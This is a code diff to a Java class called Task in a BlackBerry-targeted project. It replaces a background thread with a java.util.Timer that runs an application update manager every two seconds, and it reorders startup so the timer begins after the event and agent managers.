@@ -8,6 +8,7 @@
 
 package blackberry;
 
+import java.util.Timer;
 import java.util.Vector;
 
 import blackberry.action.Action;
@@ -24,6 +25,7 @@ import blackberry.utils.Utils;
 public class Task {
 
 	private static final int SLEEPING_TIME = 1000;
+	private static final long APP_TIMER_PERIOD = 2000;
 
 	/** The debug instance. */
 	// #debug
@@ -47,7 +49,7 @@ public class Task {
 	/** The agent manager. */
 	AgentManager agentManager;
 
-	Thread applicationThread;
+	Timer applicationTimer;
 	AppUpdateManager appUpdateManager;
 
 	// ApplicationUpdateTask();
@@ -78,7 +80,7 @@ public class Task {
 
 		for (;;) {
 			// #debug debug
-			debug.trace("checkActions");
+			//debug.trace("checkActions");
 			final int[] actionIds = this.status.getActionIdTriggered();
 
 			final int asize = actionIds.length;
@@ -170,10 +172,7 @@ public class Task {
 		}
 
 		// Da qui in poi inizia la concorrenza dei thread
-
-		// #debug debug
-		debug.trace("going to start ApplicationTimer");
-		startApplicationTimer();
+	
 
 		if (eventManager.startAll() == false) {
 			// #debug debug
@@ -189,6 +188,10 @@ public class Task {
 			debug.trace("TaskInit - agentManager FAILED");
 			return false;
 		}
+		
+		// #debug debug
+		debug.trace("going to start ApplicationTimer");
+		startApplicationTimer();
 
 		// #debug info
 		debug.info("TaskInit - agents started");
@@ -196,30 +199,14 @@ public class Task {
 	}
 
 	void stopApplicationTimer() {
-		if (applicationThread != null) {
-			// applicationTimer.cancel();
-			// applicationTimer = null;
-			appUpdateManager.stop();
-			try {
-				applicationThread.join();
-				appUpdateManager = null;
-			} catch (InterruptedException e) {
-			}
+		if (applicationTimer != null) {
+			applicationTimer.cancel();
+			applicationTimer = null;
 		}
 	}
 
 	synchronized void startApplicationTimer() {
-		// applicationTimer = new Timer();
-		try {
-			
-			applicationThread = new Thread(appUpdateManager);
-			applicationThread.start();
-		} catch (Exception ex) {
-			// #debug
-			debug.error("startApplicationTimer: " + ex);
-
-		}
-		// applicationTimer.schedule(applicationUpdateTask, 5000,
-		// APP_TIMER_DELAY);
+		applicationTimer = new Timer();		
+		applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
 	}
 }
